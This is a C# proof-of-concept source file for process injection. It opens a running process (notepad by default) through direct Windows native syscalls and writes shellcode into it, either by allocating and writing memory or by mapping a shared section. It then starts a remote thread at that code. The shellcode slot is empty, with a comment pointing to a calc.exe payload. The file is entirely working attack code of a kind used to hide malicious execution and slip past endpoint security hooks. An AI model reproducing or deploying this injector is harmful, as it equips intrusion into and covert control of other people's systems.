using System;
using System.Text;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace directInjectorPOC
{
    public struct syscall_entry
    {
        public string hash;
        public uint rva; 
    }
    public class Program
    {
        public const int ALLOCWRITE = 1;
        public const int OPENSEC = 2;

        public static IntPtr RVA2VA(IntPtr dll_base_address, int offset)
        {
            return IntPtr.Add(dll_base_address, offset);
        }
         
        static unsafe void Main(string[] args)
        {
            inject("notepad", ALLOCWRITE);
            Console.WriteLine("[+] Injection done. Press any key to exit");
            Console.ReadKey();
        }

        public static unsafe int inject(string process_name, int method)
        {

            Process target_process = Process.GetProcessesByName(process_name)[0];

            int id = target_process.Id;
            Console.WriteLine("Injecting shellcode on pid " + id);

            //shellcoderdi.py > calc.exe
            string s = @"";
         
            byte[] shellcode = Convert.FromBase64String(s);

            native.CLIENT_ID client_id = new native.CLIENT_ID();
            client_id.UniqueProcess = new IntPtr(id);
            client_id.UniqueThread = IntPtr.Zero;

            IntPtr proc_handle = IntPtr.Zero;
            native.NTSTATUS status = 0;
            status = syscalls.NtOpenProcess(ref proc_handle, native.ProcessAccessFlags.All, new native.OBJECT_ATTRIBUTES(), ref client_id);
            IntPtr remote_addr = new IntPtr();
            Console.WriteLine("NtOpenProcess: " + status);

            switch (method)
            {
                case ALLOCWRITE:
                    Console.WriteLine("[+] Using ALLOCWRITE method to allocate our shellcode in the remote process");
                    UIntPtr sz = new UIntPtr(Convert.ToUInt32(shellcode.Length));

                    syscalls.NtAllocateVirtualMemory(proc_handle, ref remote_addr, new IntPtr(0), ref sz, native.MEM_COMMIT | native.MEM_RESERVE, native.PAGE_EXECUTE_READWRITE);
                    var test = remote_addr.ToPointer();
                    IntPtr written = IntPtr.Zero;
                    Console.WriteLine("NtAllocateVirtualMemory: " + status);

                    IntPtr unmanaged_pointer = Marshal.AllocHGlobal(shellcode.Length);
                    Marshal.Copy(shellcode, 0, unmanaged_pointer, shellcode.Length);
                    syscalls.NtWriteVirtualMemory(proc_handle, ref remote_addr, unmanaged_pointer, Convert.ToUInt32(shellcode.Length), ref written);
                    Console.WriteLine("NtWriteVirtualMemory: " + status);

                    break;
                case OPENSEC:
                    Console.WriteLine("[+] Using OPENSEC method to allocate our shellcode in the remote process");

                    //create required structs/variables
                    IntPtr local_addr = new IntPtr(null);
                    Process this_proc = Process.GetCurrentProcess();
                    native.LARGE_INTEGER liVal = new native.LARGE_INTEGER();
                    uint size_ = getLowPart((uint)shellcode.Length);
                    liVal.LowPart = size_;

                    //create local section
                    IntPtr section_ = new IntPtr();
                    IntPtr view_size = (IntPtr)(shellcode.Length);
                    status = syscalls.NtCreateSection(ref section_, 0x10000000, (IntPtr)0, ref liVal, native.PAGE_EXECUTE_READWRITE, 0x08000000, (IntPtr)0);
                    Console.WriteLine("NtCreateSection: " + status);

                    //map local section
                    status = syscalls.NtMapViewOfSection(section_, this_proc.Handle, ref local_addr, (IntPtr)0, (IntPtr)0, (IntPtr)0, ref view_size, 1, 0, native.PAGE_EXECUTE_READWRITE);
                    //map remote section
                    Console.WriteLine("NtMapViewOfSection: " + status);

                    status = syscalls.NtMapViewOfSection(section_, proc_handle, ref remote_addr, (IntPtr)0, (IntPtr)0, (IntPtr)0, ref view_size, 1, 0, native.PAGE_EXECUTE_READWRITE);
                    Console.WriteLine("NtMapViewOfSection: " + status);

                    //copy shellcode to local section
                    Marshal.Copy(shellcode, 0, local_addr, shellcode.Length);

                    break;
            }



            IntPtr hRemoteThread;

            //if OPENSEC then a thread is created in a remote process with the remote section addr as starting point. 
            //if ALLOCWRITE then a thread is created poiting to a memory address with our shellcode
            status = syscalls.NtCreateThreadEx(out hRemoteThread, 0x1FFFFF, IntPtr.Zero, proc_handle, remote_addr, IntPtr.Zero, 0, 0, 0xFFFF, 0xFFFF, IntPtr.Zero);
            Console.WriteLine("NtCreateThreadEx: " + status);

            return 0;
        }

        public static uint getLowPart(uint size)
        {
            native.SYSTEM_INFO info = new native.SYSTEM_INFO();
            native.GetSystemInfo(ref info);
            return (info.dwPageSize - size % info.dwPageSize) + size;
        }

    }
}